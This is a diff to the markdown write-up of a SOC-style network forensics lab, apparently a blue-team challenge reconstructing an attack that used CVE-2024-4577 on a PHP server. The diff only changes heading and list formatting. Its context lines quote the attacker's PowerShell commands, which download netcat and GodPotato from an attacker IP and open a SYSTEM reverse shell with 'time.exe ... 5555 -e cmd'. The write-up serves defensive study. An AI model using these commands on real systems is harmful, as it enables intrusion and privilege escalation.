@@ -14,7 +14,7 @@ platform: SOC
 **Description:**
 You are a junior security analyst at a small Japanese cryptocurrency trading company. After detecting suspicious activity on the internal network, you exported a PCAP for further investigation. Analyze this capture to determine whether the environment was compromised and reconstruct the attacker’s actions.
 
-## TL;DR
+### TL;DR
 Analyzed network traffic showing exploitation of CVE-2024-4577 (PHP-CGI argument injection) against a Windows server running PHP 8.1.25. Attacker achieved RCE, established reverse shell on port 4545, then escalated privileges using GodPotato to spawn a SYSTEM-level shell on port 5555.
 
 
@@ -72,8 +72,7 @@ PS > wget http://192.168.170.128:9696/nc64.exe -o time.exe
 PS > iwr -uri "https://github.com/BeichenDream/GodPotato/releases/download/V1.20/GodPotato-NET4.exe" -Outfile TimeProvider.exe
 PS > ./TimeProvider.exe -cmd "time.exe 192.168.170.128 5555 -e cmd"
 ```
-
-\1. Downloaded `nc64.exe` (Netcat) as `time.exe`
-\2. Downloaded `GodPotato-NET4.exe` as `TimeProvider.exe`
-\3. Used GodPotato to execute Netcat with SYSTEM privileges
-\4. Established privileged reverse shell on `192.168.170.128:5555`
+1. Downloaded `nc64.exe` as `time.exe`
+2. Downloaded `GodPotato-NET4.exe` as `TimeProvider.exe`
+3. Used GodPotato to execute Netcat with SYSTEM privileges
+4. Established privileged reverse shell on `192.168.170.128:5555`
